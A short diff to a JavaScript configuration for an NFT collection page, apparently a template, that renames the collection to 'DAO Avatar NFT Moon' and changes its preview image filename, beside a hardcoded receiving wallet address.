@@ -10,14 +10,14 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 */
 
 const collectionInfo = {
-    name: "NFT Moon",
+    name: "DAO Avatar NFT Moon",
     date: "15.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
     },
     medias: {
-        preview: "ezgif.com-gif-maker (20).gif",
+        preview: "11.gif",
         favicon: "",
     },
     background: {
